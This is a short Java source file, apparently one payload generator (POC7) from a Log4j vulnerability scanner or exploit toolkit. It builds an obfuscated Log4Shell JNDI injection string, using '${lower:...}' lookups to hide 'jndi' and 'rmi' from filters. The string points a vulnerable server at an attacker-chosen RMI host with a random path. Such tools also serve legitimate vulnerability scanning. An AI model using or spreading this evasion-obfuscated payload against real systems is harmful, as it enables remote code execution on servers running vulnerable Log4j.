package cn.xxx.poc.impl;

import cn.xxx.poc.IPOC;
import cn.xxx.utils.Utils;

public class POC7 implements IPOC {
    @Override
    public String generate(String domain) {
        return "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://" + domain + "/" + Utils.GetRandomString(Utils.GetRandomNumber(2, 5)) + "}";
    }

    @Override
    public int getType() {
        return POC_TYPE_RMI;
    }
}
